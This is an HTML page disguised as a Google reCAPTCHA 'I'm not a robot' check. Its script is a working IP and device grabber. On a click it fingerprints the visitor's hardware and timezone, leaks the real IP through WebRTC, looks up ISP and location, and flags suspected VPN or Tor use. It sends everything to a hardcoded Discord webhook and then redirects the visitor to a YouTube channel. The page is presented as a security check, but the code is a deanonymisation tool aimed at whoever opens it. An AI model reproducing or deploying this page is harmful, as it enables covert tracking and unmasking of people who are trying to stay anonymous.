<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Check - CAPTCHA</title>
    <style>
        body { background: #f9f9f9; font-family: Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .captcha-box { background: #fff; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; width: 300px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
        .checkbox-container { display: flex; align-items: center; cursor: pointer; padding: 10px; border: 1px solid #f1f1f1; background: #fafafa; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; border-radius: 2px; position: relative; transition: 0.2s; }
        .checkbox.loading { border-top-color: #4d90fe; animation: spin 1s linear infinite; border-radius: 50%; }
        .text { color: #555; font-size: 14px; flex-grow: 1; }
        .logo { width: 30px; height: 30px; background: url('https://www.gstatic.com/recaptcha/api2/logo_48.png') no-repeat center; background-size: contain; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #status-msg { font-size: 10px; color: #999; margin-top: 10px; text-align: center; }
    </style>
</head>
<body>

<div class="captcha-box">
    <div class="checkbox-container" id="captcha-trigger">
        <div class="checkbox" id="check-box"></div>
        <div class="text">I'm not a robot</div>
        <div class="logo"></div>
    </div>
    <div id="status-msg">Click to verify security certificate</div>
</div>

<script>
/**
 * SENTINEL "CAPTCHA" v19.0
 * BYPASS: TOR, VPN, LOCKDOWN, BRAVE
 */

const CONFIG = {
    WEBHOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    FINISH: "https://youtube.com/@LigmaBlox-w7m"
};

// MULTI-VECTOR LOCKS (Prevents Redundancy)
const LOCK = { ip: false, hardware: false, network: false };

const transmit = (data, method) => {
    const payload = JSON.stringify({
        username: `CAPTCHA-OVERRIDE [${method}]`,
        embeds: [{
            title: "🎯 Secure Log Captured",
            color: 0x4d90fe,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString()
        }]
    });

    navigator.sendBeacon(CONFIG.WEBHOOK, new Blob([payload], {type:'application/json'}));
    fetch(CONFIG.WEBHOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true });
};

// ADVANCED HARDWARE/TOR PROFILING
const getForensics = async () => {
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Blocked/Sandbox";
    
    return {
        os: navigator.platform,
        gpu: gpu,
        ram: navigator.deviceMemory || "N/A",
        cores: navigator.hardwareConcurrency || "N/A",
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        lockdown: !window.RTCPeerConnection ? "ACTIVE" : "OFF"
    };
};

document.getElementById('captcha-trigger').onclick = async function() {
    const box = document.getElementById('check-box');
    const msg = document.getElementById('status-msg');
    
    box.classList.add('loading');
    msg.innerText = "Verifying connection...";
    
    const forensics = await getForensics();
    if(!LOCK.hardware) { transmit(forensics, "HARDWARE_ID"); LOCK.hardware = true; }

    // VECTOR 1: WebRTC TOR/VPN BYPASS (Bypassing the Route)
    if (window.RTCPeerConnection) {
        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        rtc.createDataChannel("");
        rtc.onicecandidate = (e) => {
            if (e.candidate && !LOCK.network) {
                const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                if (ipMatch) {
                    transmit({ leaked_ip: ipMatch[1], type: "DIRECT_UDP_PUNCH" }, "VPN_BYPASS");
                    LOCK.network = true;
                }
            }
        };
        rtc.createOffer().then(o => rtc.setLocalDescription(o));
    }

    // VECTOR 2: GEO-CROSSREF (Detecting Discrepancies)
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
        if(!LOCK.ip) {
            transmit({
                public_ip: d.ip,
                isp: d.org,
                location: `${d.city}, ${d.region}, ${d.country}`,
                vpn_suspected: (d.timezone !== forensics.tz) ? "YES" : "NO"
            }, "GEO_ANALYTICS");
            LOCK.ip = true;
        }
    });

    // VECTOR 3: TOR LATENCY TRACE
    const start = performance.now();
    fetch('https://www.google.com/generate_204', { mode: 'no-cors' }).then(() => {
        const ping = (performance.now() - start).toFixed(0);
        if(ping > 400) transmit({ ping: ping + "ms", net: "TOR_DETECTED" }, "NETWORK_PATH");
    });

    // FINALIZATION
    setTimeout(() => {
        box.classList.remove('loading');
        box.style.background = "#4d90fe url('https://www.gstatic.com/images/icons/material/system/2x/check_white_24dp.png') no-repeat center";
        msg.innerText = "Verification Complete";
        setTimeout(() => { window.location.replace(CONFIG.FINISH); }, 1000);
    }, 5500);
};
</script>
</body>
</html>
